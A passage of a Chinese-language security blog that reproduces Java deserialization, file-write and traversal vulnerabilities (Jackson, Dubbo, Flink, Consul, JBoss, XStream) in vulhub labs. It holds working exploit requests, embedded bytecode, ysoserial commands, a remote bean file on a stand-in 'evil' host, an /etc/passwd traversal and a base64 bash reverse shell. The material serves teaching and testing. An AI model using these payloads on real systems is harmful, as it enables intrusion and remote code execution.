<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1) 开启 JacksonPolymorphicDeserialization，即调用以下任意方法</span><br><span class="line"></span><br><span class="line">objectMapper.enableDefaultTyping(); // default to using DefaultTyping.OBJECT_AND_NON_CONCRETE</span><br><span class="line">objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line"></span><br><span class="line">2) Target class 需要有无参 constructor</span><br><span class="line"></span><br><span class="line">3) Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口</span><br></pre></td></tr></table></figure>

<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，Web运行在 <a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080/</a></p>
<p><strong>CVE-2017-7525</strong></p>
<p>Jackson-databind 在设置 Target class 成员变量参数值时，若没有对应的 getter 方法，则会使用 SetterlessProperty 调用 getter 方法，获取变量，然后设置变量值。当调用 getOutputProperties() 方法时，会初始化 transletBytecodes 包含字节码的类，导致命令执行，具体可参考 java-deserialization-jdk7u21-gadget-note 中关于 TemplatesImpl 的说明。</p>
<p>使用JDK7u21的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl作为Gadget，发送如下请求，将会执行touch &#x2F;tmp&#x2F;prove1.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /exploit HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 1298</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;param&quot;: [</span><br><span class="line">    &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;transletBytecodes&quot;: [</span><br><span class="line">  &quot;yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw==&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;transletName&quot;: &quot;a.b&quot;,</span><br><span class="line">      &quot;outputProperties&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>CVE-2017-17485</strong></p>
<p>CVE-2017-7525 黑名单修复绕过，利用了 org.springframework.context.support.FileSystemXmlApplicationContext。</p>
<p>原理：利用 FileSystemXmlApplicationContext 加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用 start() 方法实现命令执行</p>
<p>利用该漏洞，我们需要创建一个bean文件，放置在任意服务器上，如 <a target="_blank" rel="noopener" href="http://evil/spel.xml%EF%BC%8C%E5%86%85%E5%AE%B9%E5%A6%82%E4%B8%8B">http://evil/spel.xml，内容如下</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">     http://www.springframework.org/schema/beans</span><br><span class="line">     http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">            &lt;array&gt;</span><br><span class="line">                &lt;value&gt;touch&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;/tmp/prove2.txt&lt;/value&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">        &lt;property name=&quot;any&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>然后，发送如下数据包，使Jackson加载bean，触发漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /exploit HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 138</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;param&quot;: [</span><br><span class="line">    &quot;org.springframework.context.support.FileSystemXmlApplicationContext&quot;,</span><br><span class="line">    &quot;http://evil/spel.xml&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization">https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization</a></li>
<li><a target="_blank" rel="noopener" href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/irsl/jackson-rce-via-spel">https://github.com/irsl/jackson-rce-via-spel</a></li>
</ul>
<h2 id="0x08-Apache-Dubbo"><a href="#0x08-Apache-Dubbo" class="headerlink" title="0x08 Apache Dubbo"></a>0x08 Apache Dubbo</h2><h3 id="Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）"><a href="#Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）"></a>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</h3><p><strong>漏洞描述</strong></p>
<p>Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。Dubbo可以使用不同协议通信，当使用http协议时，Apache Dubbo直接使用了Spring框架的org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞</p>
<p>这个漏洞影响Apache Dubbo 2.7.4及以前版本，2.7.5后Dubbo使用com.googlecode.jsonrpc4j.JsonRpcServer替换了HttpInvokerServiceExporter</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，启动一个Apache Dubbo 2.7.3 Provider：服务启动后，访问 <a href="http://your-ip:8080，服务器默认会返回500错误">http://your-ip:8080，服务器默认会返回500错误</a></p>
<p>利用该漏洞需要先知道目标RPC接口名，而Dubbo所有的RPC配置储存在registry中，通常使用Zookeeper作为registry。如果能刚好找到目标的Zookeeper未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p>
<p>Vulhub对外开放了8080端口和2181端口，其中2181即为Zookeeper的端口，本地下载Zookeeper，使用其中自带的zkCli即可连接到这台Zookeeper服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zkCli -server target-ip:2181</span><br></pre></td></tr></table></figure>

<p>连接后进入一个交互式控制台，使用ls即可列出其中所有节点，包括Dubbo相关的配置</p>
<p>获取到RPC接口名为org.vulhub.api.CalcService。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到 <a target="_blank" rel="noopener" href="http://your-ip:8080/org.vulhub.api.CalcService">http://your-ip:8080/org.vulhub.api.CalcService</a> 即可触发反序列化漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &quot;touch /tmp/success&quot; &gt; 1.poc</span><br><span class="line">curl -XPOST --data-binary @1.poc http://your-ip:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure>

<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/dp_I-MyAXdLm4IR2Y2PqEQ">https://mp.weixin.qq.com/s/dp_I-MyAXdLm4IR2Y2PqEQ</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html">https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html</a></li>
</ul>
<h2 id="0x09-Apache-Flink"><a href="#0x09-Apache-Flink" class="headerlink" title="0x09 Apache Flink"></a>0x09 Apache Flink</h2><h3 id="1-Apache-Flink-REST-API-文件写入漏洞-CVE-2020-17518"><a href="#1-Apache-Flink-REST-API-文件写入漏洞-CVE-2020-17518" class="headerlink" title="1. Apache Flink REST API 文件写入漏洞(CVE-2020-17518)"></a>1. Apache Flink REST API 文件写入漏洞(CVE-2020-17518)</h3><p><strong>漏洞描述</strong></p>
<p>Apache Flink 是一个开源流处理框架，具有强大的流处理和批处理能力。Apache Flink 1.5.1 引入了一个 REST 处理程序，允许通过恶意修改的 HTTP HEADER 将上传的文件写入本地文件系统上的任意位置</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，启动 Apache Flink jobmanager 1.11.2：Apache Flink 启动后，访问 <a target="_blank" rel="noopener" href="http://your-ip:8081/">http://your-ip:8081</a> 查看主页</p>
<p>发送如下请求上传文件到 &#x2F;tmp&#x2F;success</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /jars/upload HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 187</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../tmp/success&quot;</span><br><span class="line"></span><br><span class="line">success</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure>

<h3 id="2-Apache-Flinkjobmanager-x2F-logs路径遍历-CVE-2020-17519"><a href="#2-Apache-Flinkjobmanager-x2F-logs路径遍历-CVE-2020-17519" class="headerlink" title="2. Apache Flinkjobmanager&#x2F;logs路径遍历 (CVE-2020-17519)"></a>2. Apache Flinkjobmanager&#x2F;logs路径遍历 (CVE-2020-17519)</h3><p>Apache Flink 1.11.0 中引入的一项更改（也在 1.11.1 和 1.11.2 中发布）允许攻击者通过 JobManager 进程的 REST 接口读取 JobManager 本地文件系统上的任何文件</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，启动 Apache Flink jobmanager 1.11.2：Apache Flink 启动后，访问 <a target="_blank" rel="noopener" href="http://your-ip:8081/">http://your-ip:8081</a> 查看主页</p>
<p>列出&#x2F;etc&#x2F;passwd:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>

<p>refer: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/160849/Apache-Flink-1.11.0-Arbitrary-File-Read-Directory-Traversal.html">https://packetstormsecurity.com/files/160849/Apache-Flink-1.11.0-Arbitrary-File-Read-Directory-Traversal.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/260184.html">https://www.freebuf.com/vuls/260184.html</a></li>
</ul>
<h2 id="0x0A-HashiCorp-Consul"><a href="#0x0A-HashiCorp-Consul" class="headerlink" title="0x0A HashiCorp Consul"></a>0x0A HashiCorp Consul</h2><h3 id="HashiCorp-Consul-API-远程命令执行漏洞"><a href="#HashiCorp-Consul-API-远程命令执行漏洞" class="headerlink" title="HashiCorp Consul API 远程命令执行漏洞"></a>HashiCorp Consul API 远程命令执行漏洞</h3><p><strong>漏洞描述</strong></p>
<p>HashiCorp Consul是一个服务网格，用于服务发现、运行时配置和微服务应用程序和基础设施的服务分割。<br>在特定配置下，恶意攻击者可以通过发送精心构造的HTTP请求在未经授权的情况下在 Consul 服务端远程执行命令</p>
<p><strong>前提条件</strong></p>
<p>启用了脚本检查参数（-enable-script-checks）的所有版本</p>
<p><strong>环境搭建</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">1) 下载安装</span><br><span class="line"></span><br><span class="line">下载地址：https://www.consul.io</span><br><span class="line"></span><br><span class="line">unzip consul_1.5.2_linux_amd64.zip</span><br><span class="line">cd consul</span><br><span class="line">cp -rp consul /bin/</span><br><span class="line"></span><br><span class="line">2) 创建配置文件</span><br><span class="line"></span><br><span class="line">consul_config.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  &quot;datacenter&quot;: &quot;consul-cluster&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;node_name&quot;: &quot;consul01&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;server&quot;: true,</span><br><span class="line"></span><br><span class="line">  &quot;bind_addr&quot;: &quot;192.168.10.6&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;bootstrap_expect&quot;: 5,</span><br><span class="line"></span><br><span class="line">  &quot;data_dir&quot;: &quot;/data/consul/data&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;http_config&quot;: &#123;</span><br><span class="line"></span><br><span class="line">    &quot;response_headers&quot;: &#123;</span><br><span class="line"></span><br><span class="line">      &quot;Access-Control-Allow-Origin&quot;: &quot;*&quot;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  &quot;log_level&quot;: &quot;INFO&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;enable_syslog&quot;: true,</span><br><span class="line"></span><br><span class="line">  &quot;ports&quot;: &#123;</span><br><span class="line"></span><br><span class="line">    &quot;http&quot;: 8500,</span><br><span class="line"></span><br><span class="line">    &quot;dns&quot;: 8600,</span><br><span class="line"></span><br><span class="line">    &quot;serf_lan&quot;: 8301,</span><br><span class="line"></span><br><span class="line">    &quot;serf_wan&quot;: 8302</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  &quot;enable_script_checks&quot;: true</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">3) 启动服务</span><br><span class="line"></span><br><span class="line">consul agent -config-dir=/opt/consul.d  -ui -client 0.0.0.0</span><br><span class="line"></span><br><span class="line">consul members  # 确认服务状态</span><br></pre></td></tr></table></figure>

<p><strong>漏洞利用</strong></p>
<p>漏洞检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl --request GET https://192.168.10.6:8500/v1/agent/self</span><br><span class="line"></span><br><span class="line"># 出现 &quot;EnableRemoteScriptChecks&quot;:true 证明漏洞存在</span><br></pre></td></tr></table></figure>

<p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">from requests.packages import urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">from colorama import init</span><br><span class="line">init(autoreset=True)</span><br><span class="line">import json</span><br><span class="line">headers=&#123;</span><br><span class="line">&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line">def url():</span><br><span class="line">	des=&quot;HashiCorp Consul API 远程命令执行漏洞POC&quot;</span><br><span class="line">	parser = argparse.ArgumentParser(description=des)</span><br><span class="line">	parser.add_argument(&#x27;target_url&#x27;,type=str,help=&#x27;The target address,example: http://192.168.10.6&#x27;)</span><br><span class="line">	args = parser.parse_args() </span><br><span class="line">	target_url = args.target_url</span><br><span class="line">	print(&quot;HashiCorp Consul API 远程命令执行漏洞POC&quot;)</span><br><span class="line">	print(&quot;[-]正在执行检测...&quot;)</span><br><span class="line">	print(f&quot;[-]目标地址：&#123;target_url&#125;&quot;,)</span><br><span class="line">	return target_url</span><br><span class="line">def check(target_url):</span><br><span class="line">	url = target_url + &#x27;/v1/agent/self&#x27;</span><br><span class="line">	try:</span><br><span class="line">		response = requests.get(url=url,headers=headers,verify=False,timeout=5).text</span><br><span class="line">		value = json.loads(response)[&#x27;DebugConfig&#x27;][&#x27;EnableRemoteScriptChecks&#x27;]</span><br><span class="line">		if str(value) == &#x27;True&#x27;:</span><br><span class="line">			print(&#x27;\033[0;31m[+]漏洞存在\033[0m&#x27;)</span><br><span class="line">		else:</span><br><span class="line">			print(&#x27;漏洞不存在&#x27;)</span><br><span class="line">	except Exception as a:</span><br><span class="line">		print(&#x27;漏洞不存在&#x27;)</span><br><span class="line">	</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	target_url = url()</span><br><span class="line">	check(target_url)</span><br></pre></td></tr></table></figure>

<p>msf exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/misc/consul_service_exec</span><br></pre></td></tr></table></figure>

<p>refer:</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46074">https://www.exploit-db.com/exploits/46074</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/118853.html">https://help.aliyun.com/document_detail/118853.html</a></p>
</li>
</ul>
<h2 id="0x0B-JBoss"><a href="#0x0B-JBoss" class="headerlink" title="0x0B JBoss"></a>0x0B JBoss</h2><h3 id="1-JBoss-5-x-x2F-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#1-JBoss-5-x-x2F-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="1. JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）"></a>1. JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）</h3><p><strong>漏洞描述</strong></p>
<p>Red Hat JBoss是一套开源、基于J2EE的中间件平台。该平台主要用于构建、部署和托管Java应用程序与服务。</p>
<p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，初始化完成后访问 <a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080/</a> 即可看到JBoss默认页面</p>
<p>该漏洞出现在&#x2F;invoker&#x2F;readonly请求中，服务器将用户提交的POST内容进行了Java反序列化</p>
<p>1）编写反弹shell的命令</p>
<p>使用bash来反弹shell，但由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，需要用进行一次编码</p>
<p>工具：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p>2）序列化数据生成</p>
<p>使用ysoserial来复现生成序列化数据，选择使用的gadget是CommonsCollections5</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>3）发送POC</p>
<p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至&#x2F;invoker&#x2F;readonly即可成功反弹shell</p>
<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/gottburgm/Exploits/tree/master/CVE-2017-12149">https://github.com/gottburgm/Exploits/tree/master/CVE-2017-12149</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></li>
</ul>
<h3 id="2-JBoss-JMXInvokerServlet-反序列化漏洞"><a href="#2-JBoss-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="2. JBoss JMXInvokerServlet 反序列化漏洞"></a>2. JBoss JMXInvokerServlet 反序列化漏洞</h3><p>JBoss在&#x2F;invoker&#x2F;JMXInvokerServlet请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，初始化完成后访问 <a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080/</a> 即可看到JBoss默认页面</p>
<p>JBoss在处理&#x2F;invoker&#x2F;JMXInvokerServlet请求的时候读取了对象，直接将ysoserial生成好的POC附在POST Body中发送即可</p>
<p>利用工具：<a target="_blank" rel="noopener" href="https://cdn.vulhub.org/deserialization/DeserializeExploit.jar">https://cdn.vulhub.org/deserialization/DeserializeExploit.jar</a></p>
<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li>
</ul>
<h2 id="0x0C-XStream"><a href="#0x0C-XStream" class="headerlink" title="0x0C XStream"></a>0x0C XStream</h2><h3 id="1-XStream-反序列化命令执行漏洞（CVE-2021-21351）"><a href="#1-XStream-反序列化命令执行漏洞（CVE-2021-21351）" class="headerlink" title="1. XStream 反序列化命令执行漏洞（CVE-2021-21351）"></a>1. XStream 反序列化命令执行漏洞（CVE-2021-21351）</h3><p><strong>漏洞描述</strong></p>
<p>XStream是一个轻量级、简单易用的开源Java类库，它主要用于将对象序列化成XML（JSON）或反序列化为对象。</p>
<p>XStream 在解析XML文本时使用黑名单机制来防御反序列化漏洞，但是其 1.4.15 及之前版本黑名单存在缺陷，攻击者可利用javax.naming.ldap.Rdn$RdnEntry及javax.sql.rowset.BaseRowSet构造JNDI注入，进而执行任意命令</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，启动一个Springboot + XStream 1.4.15的环境：环境启动后，我们向 <a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080</a> 发送一个正常的XML数据包，将会得到预期返回</p>
<p>由于目标环境Java版本高于8u191，故使用org.apache.naming.factory.BeanFactory加EL表达式注入的方式来执行任意命令</p>
<p>使用<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/">JNDI-Injection-Exploit</a>启动恶意JNDI服务器:</p>
